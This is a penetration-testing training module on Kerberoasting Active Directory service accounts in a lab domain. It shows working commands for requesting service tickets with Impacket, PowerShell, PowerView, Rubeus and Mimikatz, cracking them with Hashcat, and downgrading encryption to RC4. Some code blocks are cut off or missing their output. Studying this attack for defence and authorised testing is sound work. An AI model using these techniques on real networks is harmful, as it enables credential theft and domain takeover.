# Kerberoasting - from Linux

Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.

## Kerberoasting Overview

Kerberoasting is an Active Directory attack for lateral movement and privilege escalation that targets Service Principal Name (SPN) accounts. SPNs are unique identifiers mapping service instances to their service accounts in Kerberos.

Any domain user can request Kerberos tickets for service accounts, requiring only cleartext credentials, an NTLM hash, domain user context, or SYSTEM-level access on a domain-joined host.

Service accounts frequently have elevated privileges—often local admin or Domain Admin rights across multiple servers—due to service requirements and distributed system architectures. Finding SPNs linked to highly privileged accounts is common.

While retrieving a Kerberos ticket (TGS-REP) doesn't grant immediate command execution, the ticket is encrypted with the service account's NTLM hash. This allows offline brute-force attacks using tools like Hashcat to crack weak or reused passwords (sometimes matching the username).

Successfully cracking credentials often yields local admin access across multiple servers or Domain Admin privileges. Even low-privilege account access can be leveraged to craft service tickets—for example, accessing MSSQL as sysadmin, enabling xp_cmdshell, and achieving code execution on SQL servers.

---

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:
* From a non-domain joined Linux host using valid domain user credentials.
* From a domain-joined Linux host as root after retrieving the keytab file.
* From a domain-joined Windows host authenticated as a domain user.
* From a domain-joined Windows host with a shell in the context of a domain account.
* As SYSTEM on a domain-joined Windows host.
* From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:
* Impacket’s [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
* A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
* From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be `cracked` offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

---

## Efficacy of the Attack

Kerberoasting's success varies significantly across environments. Outcomes include:

1. **High-Risk**: Cracking TGS tickets yields Domain Admin access or credentials advancing domain compromise
2. **High-Risk**: Multiple tickets crack, but only for privileged accounts that provide additional access
3. **Medium-Risk**: Multiple tickets crack, but none belong to privileged users—no additional access gained
4. **Medium-Risk**: No tickets crack despite extensive cracking attempts with powerful tools like Hashcat on GPU rigs

Even when unsuccessful, the finding warrants documentation. While strong passwords are effective mitigating controls, they could be weakened over time or potentially cracked by determined attackers with sufficient resources.

Proper risk assessment requires distinguishing between exploitable vulnerabilities and those with effective mitigations in place. Adjust severity ratings accordingly based on actual exploitability and existing controls.

## Performing Kerberoasting with GetUserSPNs.py

**`Note: A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.`**

Let's start by installing the Impacket toolkit, which we can grab from [Here](https://github.com/fortra/impacket). After cloning the repository, we can cd into the directory and install it as follows:

### Installing Impacket using Pip
```
$ sudo python3 -m pip install .

<SNIP>
```

This will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host.

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

<SNIP>
```

Begin by enumerating SPNs in the domain using valid credentials (cleartext password, NT hash, or Kerberos ticket) and a Domain Controller IP address.

Executing the appropriate command with credentials will display a formatted list of all SPN accounts. Review the output for accounts with privileged group memberships, particularly Domain Admins.

Successfully retrieving and cracking tickets for these privileged accounts can lead to domain compromise. Always investigate group membership for all accounts—even non-privileged accounts may have easily crackable passwords that enable lateral or vertical movement within the domain.

We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.

### Requesting all TGS Tickets

We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.

With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.

To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.

### Saving the TGS Ticket to an Output File

```
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.

We've successfully cracked the user's password as `database!`. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.

### Testing Authentication against a Domain Controller

# Kerberoasting - from Windows

## Kerberoasting - Semi Manual method

Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary to enumerate SPNs in the domain.

### Enumerating SPNs with setspn.exe

```

        adfsconnect/azure01.inlanefreight.local

Existing SPN found!
```

We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:

### Targeting a Single User

```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by `Rubeus` when using the default Kerberoasting method):
* The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
* The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
* `System.IdentityModel` is a namespace that contains different classes for building security token services
* We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
* We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is **not optimal**.

### Retrieving All Tickets Using setspn.exe

```
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3

ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

<SNIP>
```

The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

## Extracting Tickets from Memory with Mimikatz

```
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export

```

If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

### Preparing the Base64 Blob for Cracking

```
[!bash!]$ echo "<base64 blob>" |  tr -d \\n 

doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskRE...<SNIP>...bG9jYWw6MTQzMw==
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

### Placing the Output into a File as .kirbi

```
[!bash!]$ cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

### Extracting the Kerberos Ticket using kirbi2john.py

```
[!bash!]$ python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

### Modifiying crack_file for Hashcat

```
[!bash!]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now we can check and confirm that we have a hash that can be fed to Hashcat.

### Viewing the Prepared Hash

```
[!bash!]$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dc...<SNIP>...119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

### Cracking the Hash with Hashcat

```
[!bash!]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

Now that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, let's look at some quicker ways. Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time. That being said, it can be useful for us to have other tricks up our sleeves and methodologies in case our automated tools fail or are blocked.

---

## Automated / Tool Based Route

Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use `PowerView` to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.

### Using PowerView to Enumerate SPN Accounts

```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

### Using PowerView to Target a Specific User

```
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177...<SNIP>...95DDD138C67495BDC772CFAC1B8EF37A1AFBAA0B73268D2CDB1A71778B57B02DC02628AF11
```

Finally, we can export all tickets to a CSV file for offline processing.

### Exporting All Tickets to a CSV File

```
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Viewing the Contents of the .CSV File

```
PS C:\htb> cat .\ilfreight_tgs.csv

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1

<SNIP>
```

We can also use `Rubeus` from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.

### Using Rubeus

```
PS C:\htb> .\Rubeus.exe

<SNIP>

Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```

As we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos. Some options include:
* Performing Kerberoasting and outputting hashes to a file
* Using alternate credentials
* Performing Kerberoasting combined with a pass-the-ticket attack
* Performing "opsec" Kerberoasting to filter out AES-enabled accounts
* Requesting tickets for accounts passwords set between a specific date range
* Placing a limit on the number of tickets requested
* Performing AES Kerberoasting

We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.

Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

## A Note on Encryption Types

Kerberoasting tools typically request **RC4 encryption** during TGS-REQ requests because RC4 is weaker and faster to crack offline with tools like Hashcat compared to AES-128 or AES-256.

Most environments yield hashes beginning with `$krb5tgs$23$*` (RC4/type 23 encryption). Occasionally, you'll receive AES-256 (type 18) hashes starting with `$krb5tgs$18$*`.

While AES-128 (type 17) and AES-256 (type 18) tickets can be cracked with Hashcat, they require significantly more time than RC4 tickets—though weak passwords remain vulnerable regardless of encryption type.

Let's walk through an example. Let's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.

```
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

```

Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname

testspn/kerberoast.inlanefreight.local                            0 testspn
```

Next, let's crack this ticket using Hashcat and note how long it took. The account is set with a weak password found in the `rockyou.txt` wordlist for our purposes. Running this through Hashcat, we see that it took four seconds to crack on a CPU, and therefore it would crack almost instantly on a powerful GPU cracking rig and probably even on a single GPU.

Let's assume that our client has set SPN accounts to support AES 128/256 encryption.

<img width="1356" height="607" alt="image" src="https://github.com/user-attachments/assets/6d81a620-3f22-456c-8703-42064b3eb3e1" />

If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes` attribute is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.

### Checking Supported Encryption Types

```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname

testspn/kerberoast.inlanefreight.local                            24 testspn
```

Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

```

To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat example_hashes table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.

### Running Hashcat & Checking the Status of the Cracking Job

When the hash finally cracks, we see that it took 4 minutes 36 seconds for a relatively simple password on a CPU. This would be greatly magnified with a stronger/longer password.

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

### Using the /tgtdeleg Flag

<img width="1253" height="670" alt="image" src="https://github.com/user-attachments/assets/3fab54b8-e2fd-4793-8b77-a44d2ac8d9d5" />

In the above image, we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make or break our assessment.

**`Note: Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.`**

It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for `RC4_HMAC_MD5` would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
